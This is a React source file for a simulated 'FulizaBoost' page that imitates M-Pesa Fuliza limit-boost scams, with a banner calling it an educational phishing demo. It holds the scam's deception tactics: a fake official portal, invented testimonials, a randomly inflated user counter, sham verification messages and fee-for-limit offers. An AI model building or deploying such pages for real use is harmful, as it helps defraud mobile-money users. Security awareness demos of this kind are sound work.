'use client';
// src/app/page.tsx - Updated to match the latest screenshot (Select Limit Screen)

import React, { useState, useEffect } from 'react';

const formatKsh = (amount: number) => `Ksh ${amount.toLocaleString('en-KE')}`;

const limits = [
  { amount: 3000, fee: 250 },
  { amount: 5000, fee: 293 },
  { amount: 7500, fee: 350 },
  { amount: 10000, fee: 500 },
  { amount: 12500, fee: 747 },
  { amount: 16000, fee: 898 },
  { amount: 21000, fee: 1015 },
  { amount: 25500, fee: 1220 },
  { amount: 30000, fee: 1533 },
  { amount: 35000, fee: 1730 },
  { amount: 45000, fee: 2000 },
  { amount: 60000, fee: 2250 },
  { amount: 70000, fee: 2500 },
];

export default function FulizaBoostClone() {
  const [step, setStep] = useState<'input' | 'loading' | 'congrats' | 'select' | 'final'>('input');
  const [usersOnline, setUsersOnline] = useState(137);
  const [phoneNumber, setPhoneNumber] = useState('0759211545'); // Your test number
  const [enteredPhone, setEnteredPhone] = useState('');
  const [loadingMsg, setLoadingMsg] = useState('');

  const loadingMessages = [
    "Connecting...",
    "Accessing secure databases...",
    "Initialising...",
    "Verifying account status...",
    "Calculating eligibility..."
  ];

  useEffect(() => {
    const interval = setInterval(() => {
      setUsersOnline(prev => prev + Math.floor(Math.random() * 3) + 1);
    }, 2800);
    return () => clearInterval(interval);
  }, []);

  const handleCheckEligibility = () => {
    if (!phoneNumber.trim()) return;
    setEnteredPhone(phoneNumber.trim());
    setStep('loading');
    setLoadingMsg(loadingMessages[0]);

    let i = 0;
    const interval = setInterval(() => {
      i++;
      if (i < loadingMessages.length) {
        setLoadingMsg(loadingMessages[i]);
      } else {
        clearInterval(interval);
        setTimeout(() => setStep('congrats'), 800);
      }
    }, 1250);
  };

  const handleProceed = () => setStep('select');

  const handleSelectLimit = () => setStep('final');

  return (
    <div className="min-h-screen bg-white font-sans">
      {/* RED WARNING BANNER */}
      <div className="fixed top-0 left-0 right-0 bg-red-600 text-white text-center py-2 text-[10px] font-bold z-50 tracking-wide">
        🚨 EDUCATIONAL PHISHING DEMO ONLY — FOR SAFARICOM CYBERSECURITY JOB APPLICATION<br />
        DO NOT ENTER REAL DATA — THIS IS A SIMULATION
      </div>

      <div className="max-w-[420px] mx-auto pt-4 pb-12">

        {/* Header */}
        <div className="text-center pt-6 pb-4">
          <h1 className="text-3xl font-bold text-gray-900">FulizaBoost</h1>
          <p className="text-sm text-gray-500 mt-1">Instant Limit Increase • Same Day Access</p>
        </div>

        {/* Live Activity Banner */}
        <div className="mx-4 bg-emerald-50 border border-emerald-100 rounded-2xl p-4 mb-8">
          <div className="flex items-center gap-2 text-xs font-medium text-emerald-600">
            <span>🔄</span> LIVE ACTIVITY
          </div>
          <p className="text-sm text-gray-700 mt-1">
            Brian O. (0725***80) boosted to Ksh 21,000 just now
          </p>
        </div>

        {/* Main Content */}
        <div className="px-4">

          {/* Input Screen */}
          {step === 'input' && (
            <div className="bg-white rounded-3xl shadow-sm border p-8">
              {/* ... (your previous input screen code remains the same) */}
              <div className="text-center">
                <h2 className="text-2xl font-semibold">Fuliza Plus+</h2>
                <p className="text-emerald-600">OFFICIAL VERIFICATION PORTAL</p>
              </div>
              <div className="mt-8">
                <div className="relative">
                  <div className="absolute left-5 top-4 text-emerald-600 text-2xl">📱</div>
                  <input
                    type="tel"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                    className="w-full bg-gray-50 border border-gray-200 focus:border-emerald-500 rounded-2xl pl-14 pr-6 py-4 outline-none"
                    placeholder="Enter M-Pesa Number"
                  />
                </div>
                <button
                  onClick={handleCheckEligibility}
                  className="mt-6 w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold text-lg"
                >
                  Check My Eligibility
                </button>
              </div>
            </div>
          )}

          {/* Loading, Congrats screens remain the same as previous version */}

          {/* SELECT LIMIT SCREEN - Matching Your Screenshot */}
          {step === 'select' && (
            <div>
              <h2 className="text-xl font-semibold text-center mb-6">Select Your New Approved Limit</h2>

              <div className="grid grid-cols-2 gap-3">
                {limits.map((opt) => (
                  <button
                    key={opt.amount}
                    onClick={handleSelectLimit}
                    className="bg-white border border-gray-200 hover:border-emerald-500 hover:shadow transition-all rounded-2xl p-5 text-center active:scale-95"
                  >
                    <div className="text-xl font-bold text-emerald-700">
                      {formatKsh(opt.amount)}
                    </div>
                    <div className="text-xs text-gray-500 mt-1">
                      FEE: KSH {opt.fee}
                    </div>
                  </button>
                ))}
              </div>

              <button
                onClick={handleSelectLimit}
                className="mt-10 w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold text-lg flex items-center justify-center gap-2"
              >
                ⚡ SELECT A LIMIT
              </button>

              <p className="text-center text-xs text-gray-500 mt-4">SELECT A LIMIT • Secure Fuliza Application</p>
            </div>
          )}

          {/* Final Ksh 0 Screen */}
          {step === 'final' && (
            <div className="text-center py-12">
              <h2 className="text-3xl font-bold text-emerald-700">Limit will be boosted to</h2>
              <p className="text-7xl font-bold text-emerald-600 mt-6">Ksh 0</p>
              <p className="mt-8 text-red-500 text-sm">* Final amount depends on full verification</p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}